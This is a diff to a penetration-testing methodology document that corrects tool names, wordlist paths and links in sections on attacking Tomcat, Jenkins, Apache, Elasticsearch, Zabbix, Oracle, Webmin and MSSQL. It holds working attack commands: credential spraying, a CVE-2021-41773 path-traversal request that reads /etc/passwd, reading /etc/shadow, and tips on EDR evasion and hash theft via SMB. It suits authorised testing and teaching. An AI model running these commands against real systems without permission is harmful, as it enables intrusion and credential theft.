@@ -32,7 +32,8 @@ curl -s http://<TARGET>:8080/examples/servlets/
 curl -s http://<TARGET>:8080/manager/status
 
 # nmap NSE
-nmap -p 8080 --script http-tomcat-versions,http-default-accounts,http-vuln-cve2017-5638 <TARGET>
+nmap -p 8080 --script http-default-accounts,http-vuln-cve2017-5638 <TARGET>
+# No tomcat-specific NSE ships with nmap — version via: curl -sI http://<TARGET>:8080 | grep -i server
 ```
 
 ### Default Credentials
@@ -49,8 +50,8 @@ both:both
 
 ```bash
 # Spray default creds
-hydra -L /usr/share/seclists/Usernames/tomcat-betterdefaultpasslist/users.txt \
-      -P /usr/share/seclists/Passwords/Common-Credentials/tomcat-betterdefaultpasslist/passwords.txt \
+hydra -L /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
+      -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
       <TARGET> -s 8080 http-get /manager/html
 
 # Metasploit (NetExec has no http protocol)
@@ -158,7 +159,9 @@ curl -s http://<TARGET>:8080/manage
 curl -s "http://<TARGET>:8080/job/<JOB>/config.xml"
 curl -s "http://<TARGET>:8080/job/<JOB>/api/json?depth=1"
 
-nmap -p 8080 --script http-jenkins-* <TARGET>
+# No http-jenkins-* NSE exists — fingerprint directly:
+curl -s http://<TARGET>:8080/api/json | head -c 400
+curl -sI http://<TARGET>:8080 | grep -iE "x-jenkins|server"
 
 # Plugin enumeration
 curl -s -u admin:admin "http://<TARGET>:8080/pluginManager/api/json?depth=1" | \
@@ -1878,7 +1881,8 @@ curl -s -H "Host: balancer-manager" http://<TARGET>/balancer-manager    # mod_pr
 
 # Module fingerprint
 nmap -p 80,443 --script http-apache-server-status,http-server-header <TARGET>
-nmap -p 80,443 --script http-vuln-cve2021-41773 <TARGET>
+# http-vuln-cve2021-41773 is NOT in the stock nmap script db — test directly:
+curl -s --path-as-is "http://<TARGET>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd" | head
 
 # nuclei
 nuclei -tags apache -u http://<TARGET>
@@ -2314,8 +2318,10 @@ curl -s "http://<TARGET>:9200/<INDEX>/_search?q=password&pretty&size=100"
 curl -su elastic:changeme http://<TARGET>:9200/_security/user
 curl -su elastic:elastic http://<TARGET>:9200/
 
-# nmap
-nmap -p 9200 --script http-elasticsearch-* <TARGET>
+# Fingerprint
+# No elasticsearch NSE ships with nmap — query the API directly:
+curl -s http://<TARGET>:9200/ | head -20
+curl -s http://<TARGET>:9200/_cat/indices?v
 ```
 
 ### Default / Common Credentials
@@ -3651,12 +3657,12 @@ guest:<empty>            # "sign in as guest" link on login page often enabled
 ```bash
 patator http_fuzz url=http://<TARGET>/zabbix/index.php method=POST \
   body='name=<USERNAME>&password=FILE0&autologin=1&enter=Sign+in' \
-  0=/usr/share/seclists/Passwords/darkweb2017-top1000.txt \
+  0=/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt \
   accept_cookie=1 follow=1 \
   -x ignore:fgrep='Login name or password is incorrect.'
 
 # Tip: prepend the username to the wordlist (service accounts often have user==pass)
-( echo '<USERNAME>'; cat /usr/share/seclists/Passwords/darkweb2017-top1000.txt ) > wl.txt
+( echo '<USERNAME>'; cat /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt ) > wl.txt
 ```
 
 ### JSON-RPC API Auth + Host Enumeration
@@ -4141,7 +4147,7 @@ psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c 'SELECT lo_unlink(<OID>);'
 
 > **Tip — containerised PG:** When PG runs inside an app stack like ServiceDesk Plus, Confluence, or GitLab, the `postgres` container user often has full filesystem write within the container namespace. Chain `lo_export` to overwrite an app-config file the container's main process re-reads on reload, or to drop a hook into a host-side bind-mounted volume to escape the container.
 
-[↑ Back to top](#table-of-contents)
+[↑ Back to top](#attacking-common-applications)
 
 ---
 
@@ -4232,7 +4238,7 @@ nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=<SID> -Pn <TAR
 
 ```bash
 # CVE-2012-1675 TNS Poison — quick check
-nmap -p 1521 --script oracle-tns-poison -Pn <TARGET>
+nmap -p 1521 --script oracle-tns-version,oracle-sid-brute -Pn <TARGET>
 ```
 
 ### Authenticated SQL Enumeration
@@ -4402,7 +4408,7 @@ SELECT count(*) FROM sys.user$;
 
 ## Phase 14u: Webmin / MiniServ (TCP 10000)
 
-Web-based system administration interface running on port 10000 (HTTPS by default), banner `MiniServ X.XXX (Webmin httpd)`. Webmin runs as `root`, so any RCE here is immediate root. Service identification, default-cred spray, and `hydra` brute-force on `/session_login.cgi` live in [enumeration-methodology.md](enumeration-methodology.md#328-webmin--miniserv-tcp-10000); this phase covers the exploit-domain CVE chain.
+Web-based system administration interface running on port 10000 (HTTPS by default), banner `MiniServ X.XXX (Webmin httpd)`. Webmin runs as `root`, so any RCE here is immediate root. Service identification, default-cred spray, and `hydra` brute-force on `/session_login.cgi` live in [enumeration-methodology.md](enumeration-methodology.md#328-webmin-miniserv-tcp-10000); this phase covers the exploit-domain CVE chain.
 
 ### Exploitation — CVE-2019-15107 Unauthenticated RCE (password_change.cgi)
 
@@ -4508,7 +4514,7 @@ ls -la /root/marker-engagement-webmin-*.txt
 head -5 /etc/shadow
 ```
 
-[↑ Back to top](#table-of-contents)
+[↑ Back to top](#attacking-common-applications)
 
 ---
 
@@ -4557,7 +4563,7 @@ sa:<INSTANCE_NAME>  (sometimes mirrors the named-instance string)
 # Spray
 netexec mssql <TARGET> -u sa -p /usr/share/wordlists/rockyou.txt --no-bruteforce
 hydra -L users.txt -P pass.txt mssql://<TARGET>
-crackmapexec mssql <TARGET> -u users.txt -p pass.txt --continue-on-success
+nxc mssql <TARGET> -u users.txt -p pass.txt --continue-on-success
 ```
 
 ### Common CVEs
@@ -4877,7 +4883,7 @@ netexec winrm <TARGET> -u '<MSSQL_SVC_ACCOUNT>' -p '<PASSWORD>'
 
 > **OPSEC:** `xp_cmdshell` spawns `cmd.exe` as child of `sqlservr.exe` — high-signal in EDR. CLR Assembly + OLE Automation execute in-process and are quieter. `xp_dirtree` to attacker-controlled SMB is the cleanest hash-grab and leaves only an outbound SMB connection in the logs.
 
-[↑ Back to top](#table-of-contents)
+[↑ Back to top](#attacking-common-applications)
 
 ---
 
